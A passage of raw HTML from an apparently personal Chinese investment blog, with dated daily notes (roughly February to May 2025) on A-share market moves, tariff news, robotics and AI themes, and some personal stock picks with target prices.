周三</h3><h4 id="A股-80"><a href="#A股-80" class="headerlink" title="A股"></a>A股</h4><p>大金融组织指数上攻3400点，而科技题材继续弱势，五月中下旬保持谨慎，耐心持有低位价值股。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250514.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月13日-周二"><a href="#5月13日-周二" class="headerlink" title="5月13日 周二"></a>5月13日 周二</h3><h4 id="A股-81"><a href="#A股-81" class="headerlink" title="A股"></a>A股</h4><p>指数如期高开低走，但承接盘很少，继续观察明天是否修复，继续弱势可能是见顶信号。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250513.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月12日-周一"><a href="#5月12日-周一" class="headerlink" title="5月12日 周一"></a>5月12日 周一</h3><h4 id="A股-82"><a href="#A股-82" class="headerlink" title="A股"></a>A股</h4><p>资金提前博弈关税取消利好，明天盯紧开盘情况，谨防外资再次上演盘后拉高砸盘戏码，做好获利盘涌出的交易。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250512.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月9日-周五"><a href="#5月9日-周五" class="headerlink" title="5月9日 周五"></a>5月9日 周五</h3><h4 id="A股-83"><a href="#A股-83" class="headerlink" title="A股"></a>A股</h4><p>三大指数齐跌，科技题材全线回调，银行和权重消费支撑盘面，静待周末谈判结果。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250509.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月8日-周四"><a href="#5月8日-周四" class="headerlink" title="5月8日 周四"></a>5月8日 周四</h3><h4 id="A股-84"><a href="#A股-84" class="headerlink" title="A股"></a>A股</h4><p>军工继续拉涨，三大指数可能集体向上补缺口，继续观察情绪指标，寻找低位价值股和趋势题材。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250508.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月7日-周三"><a href="#5月7日-周三" class="headerlink" title="5月7日 周三"></a>5月7日 周三</h3><h4 id="A股-85"><a href="#A股-85" class="headerlink" title="A股"></a>A股</h4><p>指数在顶级会议利好催化下高开，全天大量获利盘抛出，持续低走，可能是见顶信号，注意回避高位小盘股。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250507.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月6日-周二"><a href="#5月6日-周二" class="headerlink" title="5月6日 周二"></a>5月6日 周二</h3><h4 id="A股-86"><a href="#A股-86" class="headerlink" title="A股"></a>A股</h4><p>全盘普涨，向上补缺口动能充足，但二季度整体还是看3150-3350震荡，注意获利了结。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250506.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月30日-周三"><a href="#4月30日-周三" class="headerlink" title="4月30日 周三"></a>4月30日 周三</h3><h4 id="策略-1"><a href="#策略-1" class="headerlink" title="策略"></a>策略</h4><p>美元指数超跌，5月看美元反弹，商品和港股承压，港股补缺后可能率先向下。四月会议没有出现实质性利好，还是继续以防守策略配置，红利资产具备性价比时可以做高低切换的策略，科技题材在指数深跌之后再布局。</p><h3 id="4月29日-周二"><a href="#4月29日-周二" class="headerlink" title="4月29日 周二"></a>4月29日 周二</h3><h4 id="A股-87"><a href="#A股-87" class="headerlink" title="A股"></a>A股</h4><p>指数继续缩量阴跌，科技股还要调整充分后才有继续，继续持币观察。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250429.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月28日-周一"><a href="#4月28日-周一" class="headerlink" title="4月28日 周一"></a>4月28日 周一</h3><h4 id="A股-88"><a href="#A股-88" class="headerlink" title="A股"></a>A股</h4><p>个股大面积下跌，资金拉升大盘股支撑指数，但不改回调趋势，等待调整到位后再考虑布局概念股。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250428.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月25日-周五"><a href="#4月25日-周五" class="headerlink" title="4月25日 周五"></a>4月25日 周五</h3><h4 id="A股-89"><a href="#A股-89" class="headerlink" title="A股"></a>A股</h4><p>资金情绪寡淡，业绩雷叠加预期落空和假期引发指数可能二次探底，继续观察。</p><h3 id="4月24日-周四"><a href="#4月24日-周四" class="headerlink" title="4月24日 周四"></a>4月24日 周四</h3><h4 id="A股-90"><a href="#A股-90" class="headerlink" title="A股"></a>A股</h4><p>科技股继续回调，短期内有向上补缺口后向下的预期，继续等待再次探底。</p><h3 id="4月23日-周三"><a href="#4月23日-周三" class="headerlink" title="4月23日 周三"></a>4月23日 周三</h3><h4 id="A股-91"><a href="#A股-91" class="headerlink" title="A股"></a>A股</h4><p>市场持续缩量，没有题材主线出现，资金得到政治局会议相关政策出台。</p><h3 id="4月22日-周二"><a href="#4月22日-周二" class="headerlink" title="4月22日 周二"></a>4月22日 周二</h3><h4 id="A股-92"><a href="#A股-92" class="headerlink" title="A股"></a>A股</h4><p>市场强行托举，题材科技股要注意风险，等待风险释放再考虑布局科技股，同时关注重大政策发布的可能性。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250422.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月21日-周一"><a href="#4月21日-周一" class="headerlink" title="4月21日 周一"></a>4月21日 周一</h3><h4 id="A股-93"><a href="#A股-93" class="headerlink" title="A股"></a>A股</h4><p>开盘开拉，全天高位震荡，DS概念和机器人概念有效回升，但从市场节奏来看反弹段落接近尾声，警惕短期大幅下跌，近期黄金持续飙升，沪金和贵金属板块也可以在回撤后开始定投。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250421.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月18日-周五"><a href="#4月18日-周五" class="headerlink" title="4月18日 周五"></a>4月18日 周五</h3><h4 id="A股-94"><a href="#A股-94" class="headerlink" title="A股"></a>A股</h4><p>419魔咒来临，国家队仍在支撑指数，成交持续缩量，场外炒作资金继续观望，等待下周确立方向开始布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250418.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月17日-周四"><a href="#4月17日-周四" class="headerlink" title="4月17日 周四"></a>4月17日 周四</h3><h4 id="A股-95"><a href="#A股-95" class="headerlink" title="A股"></a>A股</h4><p>行情持续寡淡，国家队还有护盘行为，目前继续跟踪题材主线，直到下周交割结束年报披露结束可能开启下一波炒作行情。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250417.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月16日-周三"><a href="#4月16日-周三" class="headerlink" title="4月16日 周三"></a>4月16日 周三</h3><h4 id="A股-96"><a href="#A股-96" class="headerlink" title="A股"></a>A股</h4><p>419魔咒即将来临，国家队强势护盘指数，但题材下挫，目前先看补上周跳空高开缺口再博弈短期反弹，题材炒作要在月底博弈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250416.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月10日-周四"><a href="#4月10日-周四" class="headerlink" title="4月10日 周四"></a>4月10日 周四</h3><h4 id="A股-97"><a href="#A股-97" class="headerlink" title="A股"></a>A股</h4><p>关税延期，影响初步宣告结束，但持续影响我国基本面，短期内震荡可能再次探底，继续回归观察流动性炒作题材的逻辑。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250410.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月9日-周三"><a href="#4月9日-周三" class="headerlink" title="4月9日 周三"></a>4月9日 周三</h3><h4 id="A股-98"><a href="#A股-98" class="headerlink" title="A股"></a>A股</h4><p>多头反扑，各大板块探底暴力拉升，日波达15%以上，目前继续认为还没有见市场底，继续做单日博弈盘中波动。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250409.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月8日-周二"><a href="#4月8日-周二" class="headerlink" title="4月8日 周二"></a>4月8日 周二</h3><h4 id="A股-99"><a href="#A股-99" class="headerlink" title="A股"></a>A股</h4><p>指数并没有强力反包，央国企增持，“平准基金”拉升权重，但题材仍然在继续下杀，静待下一次宣泄结束可以博弈超跌反弹，尤其以AI和机器人错杀的品种为主。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250408.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月7日-周一"><a href="#4月7日-周一" class="headerlink" title="4月7日 周一"></a>4月7日 周一</h3><h4 id="A股-100"><a href="#A股-100" class="headerlink" title="A股"></a>A股</h4><p>见证历史！A股情绪崩塌，流动性危机，盘中超3000股跌停，创业板跌超10%，目前等待下杀到位情绪明朗后再介入。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250407.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月3日-周四"><a href="#4月3日-周四" class="headerlink" title="4月3日 周四"></a>4月3日 周四</h3><h4 id="A股-101"><a href="#A股-101" class="headerlink" title="A股"></a>A股</h4><p>关税超预期，外贸企业崩跌，神秘资金护盘，静待反制措施，目前有很多科技股杀跌到位，等待下一波科技行情。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250403.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月2日-周三"><a href="#4月2日-周三" class="headerlink" title="4月2日 周三"></a>4月2日 周三</h3><h4 id="A股-102"><a href="#A股-102" class="headerlink" title="A股"></a>A股</h4><p>地量已至，资金避险情绪严重，对等关税利空即将落地，明天将显现真实行情，积极寻找月度主线。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250402.png" srcset="/img/loading.gif" lazyload></p><h3 id="4月1日-周二"><a href="#4月1日-周二" class="headerlink" title="4月1日 周二"></a>4月1日 周二</h3><h4 id="A股-103"><a href="#A股-103" class="headerlink" title="A股"></a>A股</h4><p>指数放量小幅反弹，但题材仍未表现，资金避险情绪继续演绎，四月叠加流动性萎缩和年报利空，指数空间不大，做一些单吊策略。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250401.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月31日-周一"><a href="#3月31日-周一" class="headerlink" title="3月31日 周一"></a>3月31日 周一</h3><h4 id="A股-104"><a href="#A股-104" class="headerlink" title="A股"></a>A股</h4><p>指数放量下跌探底回升，但关税未至，本周重点关注调整充分的科技股和防御板块的做多趋势是否减弱。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250331.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月28日-周五"><a href="#3月28日-周五" class="headerlink" title="3月28日 周五"></a>3月28日 周五</h3><h4 id="A股-105"><a href="#A股-105" class="headerlink" title="A股"></a>A股</h4><p>静候关税利空落地，继续坚定看多机器人。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250328.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月27日-周四"><a href="#3月27日-周四" class="headerlink" title="3月27日 周四"></a>3月27日 周四</h3><h4 id="A股-106"><a href="#A股-106" class="headerlink" title="A股"></a>A股</h4><p>指数继续缩量反弹，题材内分化，四月继续以涨大跌小为主旋律，等到大盘科技股下跌到位再介入。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250327.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月26日-周三"><a href="#3月26日-周三" class="headerlink" title="3月26日 周三"></a>3月26日 周三</h3><h4 id="A股-107"><a href="#A股-107" class="headerlink" title="A股"></a>A股</h4><p>流动性持续萎缩，题材缩量反弹，仍有很多概念调整不到位，继续坚守防御板块和寻找低位价值股票，四月不宜对指数过分乐观。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250326.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月25日-周二"><a href="#3月25日-周二" class="headerlink" title="3月25日 周二"></a>3月25日 周二</h3><h4 id="A股-108"><a href="#A股-108" class="headerlink" title="A股"></a>A股</h4><p>指数继续杀跌，流动性萎缩，观察是否能强力补量反弹。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250325.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月24日-周一"><a href="#3月24日-周一" class="headerlink" title="3月24日 周一"></a>3月24日 周一</h3><h4 id="A股-109"><a href="#A股-109" class="headerlink" title="A股"></a>A股</h4><p>指数大幅杀跌后尾盘拉回，但成交依然缩量，等待时间周期发生转变，机器人依然是多头发动行情的主线。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250324.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月21日-周五"><a href="#3月21日-周五" class="headerlink" title="3月21日 周五"></a>3月21日 周五</h3><h4 id="A股-110"><a href="#A股-110" class="headerlink" title="A股"></a>A股</h4><p>机器人板块大幅下跌，还没有下杀到位，但指数不会崩盘，还有反弹预期，但四月将至，减少攻击策略的布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250321.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-2"><a href="#策略-2" class="headerlink" title="策略"></a>策略</h4><p>螺旋：宽货币政策下科技股会继续走结构性行情，长债目前超跌，四月基本面压制盘面可以在长债避险。</p><h3 id="3月20日-周四"><a href="#3月20日-周四" class="headerlink" title="3月20日 周四"></a>3月20日 周四</h3><h4 id="A股-111"><a href="#A股-111" class="headerlink" title="A股"></a>A股</h4><p>交割在即大盘向下调整，目前还在震荡区间内，观察未来几个交易日能否补上量能并出现炒作情绪。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250320.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月19日-周三"><a href="#3月19日-周三" class="headerlink" title="3月19日 周三"></a>3月19日 周三</h3><h4 id="A股-112"><a href="#A股-112" class="headerlink" title="A股"></a>A股</h4><p>AI概念下跌，机器人板块分化，中证1000期现差缩小，静待大盘选择方向。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250319.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月18日-周二"><a href="#3月18日-周二" class="headerlink" title="3月18日 周二"></a>3月18日 周二</h3><h4 id="A股-113"><a href="#A股-113" class="headerlink" title="A股"></a>A股</h4><p>指数空间被继续压缩，没有炒作主线出现，进行策略转向，买入防御类品种等待科技股大跌。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250318.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月17日-周一"><a href="#3月17日-周一" class="headerlink" title="3月17日 周一"></a>3月17日 周一</h3><h4 id="A股-114"><a href="#A股-114" class="headerlink" title="A股"></a>A股</h4><p>机器人概念继续炒作，大盘缩量震荡，还未选择方向，继续跟踪量能和国债指数相关指标，注意止盈以防大幅回踩，寻找低位品种。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250317.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月15日-周六"><a href="#3月15日-周六" class="headerlink" title="3月15日 周六"></a>3月15日 周六</h3><h4 id="策略-3"><a href="#策略-3" class="headerlink" title="策略"></a>策略</h4><p>科技在周五成功反包，但春季行情终会褪去，题材的机会以跌买涨卖为主，继续做单吊低位品种，四月资金可能会进入红利炒作防守期，关注低位红利的机会。</p><h3 id="3月14日-周五"><a href="#3月14日-周五" class="headerlink" title="3月14日 周五"></a>3月14日 周五</h3><h4 id="A股-115"><a href="#A股-115" class="headerlink" title="A股"></a>A股</h4><p>大盘暴力拉涨3400点，权重领涨，科技受到带动跟涨，目前战线收缩完成，小盘股空间有限，继续做超跌的补涨。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250314.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月13日-周四"><a href="#3月13日-周四" class="headerlink" title="3月13日 周四"></a>3月13日 周四</h3><h4 id="A股-116"><a href="#A股-116" class="headerlink" title="A股"></a>A股</h4><p>题材暴力下杀，资金高低切换，大钱有在3300～3400点来回做T的嫌疑，收缩战线成功，单吊瞄准胜率高的品种。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250313.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-4"><a href="#策略-4" class="headerlink" title="策略"></a>策略</h4><p>螺旋：科技行情没有结束，机器人可以继续做多，但往红利的风格切换可能上演</p><h3 id="3月12日-周三"><a href="#3月12日-周三" class="headerlink" title="3月12日 周三"></a>3月12日 周三</h3><h4 id="A股-117"><a href="#A股-117" class="headerlink" title="A股"></a>A股</h4><p>尾盘突然港A股联动下杀，但好在成交放量，情绪继续活跃，下旬窗口即将到来，短期观察低位低波品种，收缩战线。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250312.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月11日-周二"><a href="#3月11日-周二" class="headerlink" title="3月11日 周二"></a>3月11日 周二</h3><h4 id="A股-118"><a href="#A股-118" class="headerlink" title="A股"></a>A股</h4><p>指数受到昨日美股暴跌影响跳空低开，尾盘强势拉升至海平面以上，说明多头进攻还没有结束，继续盯紧早盘盘面，做好高低切换，看好大盘上冲3400点。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250311.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-5"><a href="#策略-5" class="headerlink" title="策略"></a>策略</h4><p>欧阳：继续进攻，看好AI产业链</p><h3 id="3月10日-周一"><a href="#3月10日-周一" class="headerlink" title="3月10日 周一"></a>3月10日 周一</h3><h4 id="A股-119"><a href="#A股-119" class="headerlink" title="A股"></a>A股</h4><p>指数探底回升，情绪龙头频繁试盘，但全盘成交量显著萎缩，空窗期继续做好盘中的高抛低吸。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250310.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-6"><a href="#策略-6" class="headerlink" title="策略"></a>策略</h4><p>欧阳：明天继续调整见底，之后开启上攻3400点，港股可能要回调顿挫</p><p>螺旋：机器人元年，继续看多机器人，大盘短期偏向继续震荡，寻找补涨品种</p><h3 id="3月9日-周日"><a href="#3月9日-周日" class="headerlink" title="3月9日 周日"></a>3月9日 周日</h3><h4 id="策略-7"><a href="#策略-7" class="headerlink" title="策略"></a>策略</h4><p>超级题材DS和人形机器人的炒作会至少持续到六月，成交量决定短期走势，但中证1000的涨幅空间受到压缩，除非持续放量牛市爆发，否则很可能在三四月经历一波业绩杀，继续收缩战线至4支持仓左右，题材和权重兼有以及在多空之前反复横跳只会压缩利润空间，目前以40%和40%题材和20%灵活资金进行建仓，远离基本面相关品种，情绪大杀时关注低位价值股机会。</p><h3 id="3月7日-周五"><a href="#3月7日-周五" class="headerlink" title="3月7日 周五"></a>3月7日 周五</h3><h4 id="A股-120"><a href="#A股-120" class="headerlink" title="A股"></a>A股</h4><p>科技题材分化回调，继续止盈其他题材向超级主线DS和人形机器人靠拢，在主线内反复做T，高抛低吸，但始终看涨。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250307.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-8"><a href="#策略-8" class="headerlink" title="策略"></a>策略</h4><p>欧阳：再度回调一两天后上冲3400点。</p><h3 id="3月6日-周四"><a href="#3月6日-周四" class="headerlink" title="3月6日 周四"></a>3月6日 周四</h3><h4 id="A股-121"><a href="#A股-121" class="headerlink" title="A股"></a>A股</h4><p>互联网题材继续爆发，大盘放量大涨，多头攻势还未结束，连板高位股注意止盈，上冲3400点过后注意题材中下旬退潮。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250306.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-9"><a href="#策略-9" class="headerlink" title="策略"></a>策略</h4><p>欧阳：明天回调</p><p>螺旋：成交量是关键，注意出现放量滞涨，如果消费和撑盘品种上攻而科技股回落风险很可能会出现，低吸做T。</p><h3 id="3月5日-周三"><a href="#3月5日-周三" class="headerlink" title="3月5日 周三"></a>3月5日 周三</h3><h4 id="A股-122"><a href="#A股-122" class="headerlink" title="A股"></a>A股</h4><p>DS概念复苏，前期龙头在20日线企稳上攻，似有二波趋势，继续做收缩战线操作，执行跌买涨卖操作，谨慎追涨。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250305.png" srcset="/img/loading.gif" lazyload></p><h3 id="3月4日-周二"><a href="#3月4日-周二" class="headerlink" title="3月4日 周二"></a>3月4日 周二</h3><h4 id="A股-123"><a href="#A股-123" class="headerlink" title="A股"></a>A股</h4><p>机器人反抽，补量上攻才能确立趋势，持续缩量要谨防大杀跌，获利股继续止盈收缩战线。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250304.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-10"><a href="#策略-10" class="headerlink" title="策略"></a>策略</h4><p>螺旋：3400点是极限，题材会轮动炒作，机器人行情会持续，以跌买涨卖进行操作</p><p>欧阳：近五个交易日下探3270～3300区间后开启下一波上攻行情，看好半导体和DS概念，机器人看到30日线企稳反弹</p><h3 id="3月3日-周一"><a href="#3月3日-周一" class="headerlink" title="3月3日 周一"></a>3月3日 周一</h3><h4 id="A股-124"><a href="#A股-124" class="headerlink" title="A股"></a>A股</h4><p>今日机器人高位股再次回调，继续相信机器人会不断创新高。</p><h3 id="3月2日-周日"><a href="#3月2日-周日" class="headerlink" title="3月2日 周日"></a>3月2日 周日</h3><h4 id="策略-11"><a href="#策略-11" class="headerlink" title="策略"></a>策略</h4><table><thead><tr><th align="center">股票名</th><th align="center">建仓价格区间</th><th align="center">目标价</th></tr></thead><tbody><tr><td align="center">中金公司</td><td align="center">33.00～35.00</td><td align="center">40.00</td></tr><tr><td align="center">紫金矿业</td><td align="center">15.00～16.00</td><td align="center">17.00</td></tr><tr><td align="center">卧龙电驱</td><td align="center">23.00～25.00</td><td align="center">30.00</td></tr><tr><td align="center">五洲新春</td><td align="center">43.00～45.00</td><td align="center">50.00</td></tr><tr><td align="center">祥鑫科技</td><td align="center">48.00～50.00</td><td align="center">60.00</td></tr><tr><td align="center">北特科技</td><td align="center">50.00～51.00</td><td align="center">60.00</td></tr><tr><td align="center">柯力传感</td><td align="center">77.00～80.00</td><td align="center">100.00</td></tr><tr><td align="center">鸣志电器</td><td align="center">75.00～80.00</td><td align="center">100.00</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="2月28日-周五"><a href="#2月28日-周五" class="headerlink" title="2月28日 周五"></a>2月28日 周五</h3><h4 id="A股-125"><a href="#A股-125" class="headerlink" title="A股"></a>A股</h4><p>大盘全线暴跌，但指数预期不变，机器人大幅回调是买入机会，上半年以人工智能概念和机器人概念为主布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250228.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-12"><a href="#策略-12" class="headerlink" title="策略"></a>策略</h4><p>2月的策略买入股票大部分在大盘上攻的带领下均有不错的涨幅，唯有红利股持续弱势，目前认为小票炒作的行情还会持续，尤其叠加两会支持新兴产业的利好会带动机器人和人工智能板块不断新高，但三月财报季垃圾股的危机也不能忽视。当前判断行情最为重要的指标是成交量，如果下跌和修复都骤然缩量到1.5w亿以下则要考虑收缩布局，成交情绪活跃，题材炒作则会不断持续，回调视为博弈机会。3月要继续观察政策利好的强度，没有强有力的刺激上证指数3400点附近已经很极限了，做好震荡预期管理。</p><h3 id="2月27日-周四"><a href="#2月27日-周四" class="headerlink" title="2月27日 周四"></a>2月27日 周四</h3><h4 id="A股-126"><a href="#A股-126" class="headerlink" title="A股"></a>A股</h4><p>盘中巨震，午盘科50跌超2%收盘接近拉红，说明指数还没有涨到位，题材炒作会继续，继续观察成交量变化，成交量没有持续萎靡就可以继续做多情绪龙头，两会将至警惕回调，适当减少仓位。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250227.png" srcset="/img/loading.gif" lazyload></p><h3 id="2月26日-周三"><a href="#2月26日-周三" class="headerlink" title="2月26日 周三"></a>2月26日 周三</h3><h4 id="A股-127"><a href="#A股-127" class="headerlink" title="A股"></a>A股</h4><p>板块快速轮动，券商受合并小作文催化拉涨，说明市场做多情绪浓厚，但短期积累了大量获利盘，警惕盘中巨震。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250226.png" srcset="/img/loading.gif" lazyload></p><h3 id="2月25日-周二"><a href="#2月25日-周二" class="headerlink" title="2月25日 周二"></a>2月25日 周二</h3><h4 id="A股-128"><a href="#A股-128" class="headerlink" title="A股"></a>A股</h4><p>高位DS概念股大跌，机器人继续强势，短期内回调还没有充分，继续观察做多机器人概念股和人工智能概念股。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250225.png" srcset="/img/loading.gif" lazyload></p><h3 id="2月24日-周一"><a href="#2月24日-周一" class="headerlink" title="2月24日 周一"></a>2月24日 周一</h3><h4 id="A股-129"><a href="#A股-129" class="headerlink" title="A股"></a>A股</h4><p>AI概念分化，大盘回调，短期内场外继续观察，不会连续大回调，周三交割附近如果情绪被持续压制可以布局反弹。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250224.png" srcset="/img/loading.gif" lazyload></p><h3 id="2月23日-周日"><a href="#2月23日-周日" class="headerlink" title="2月23日 周日"></a>2月23日 周日</h3><h4 id="策略-13"><a href="#策略-13" class="headerlink" title="策略"></a>策略</h4><p>中长线：沃尔核材、卧龙电驱、紫光股份</p><p>概念线：云赛智联、科华数据、东华软件、拓维信息、南威软件</p><h3 id="2月21日-周五"><a href="#2月21日-周五" class="headerlink" title="2月21日 周五"></a>2月21日 周五</h3><h4 id="A股-130"><a href="#A股-130" class="headerlink" title="A股"></a>A股</h4><p>炒作高潮已至，短期上行空间极小，卖出盈利仓位持币耐心等待调整到位。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250221.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-14"><a href="#策略-14" class="headerlink" title="策略"></a>策略</h4><p>买入巨轮智能，减仓利欧股份、三六零，卖出润达医疗、国新健康、梦网科技、恒生电子、莲花控股、冀东装备、南京熊猫</p><h3 id="2月20日-周四"><a href="#2月20日-周四" class="headerlink" title="2月20日 周四"></a>2月20日 周四</h3><h4 id="A股-131"><a href="#A股-131" class="headerlink" title="A股"></a>A股</h4><p>围绕杭州六小龙的题材炒作还在继续，红利维持弱势，中证1000领涨，虽然近期没有指数大涨预期，但贯穿全年的大题材已清晰可见，回调是调仓补充概念股持仓的机会。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250220.png" srcset="/img/loading.gif" lazyload></p><h3 id="2月19日-周三"><a href="#2月19日-周三" class="headerlink" title="2月19日 周三"></a>2月19日 周三</h3><h4 id="A股-132"><a href="#A股-132" class="headerlink" title="A股"></a>A股</h4><p>大盘超预期反包，AI应用和互联网产业的行情会持续一段时间，逐渐过渡到中线持有策略。</p><h3 id="2月18日-周二"><a href="#2月18日-周二" class="headerlink" title="2月18日 周二"></a>2月18日 周二</h3><h4 id="A股-133"><a href="#A股-133" class="headerlink" title="A股"></a>A股</h4><p>大盘开启回调周期，高位软件股大幅下跌，目前看下跌还未结束，整理好仓位寻找低吸机会。</p><h4 id="策略-15"><a href="#策略-15" class="headerlink" 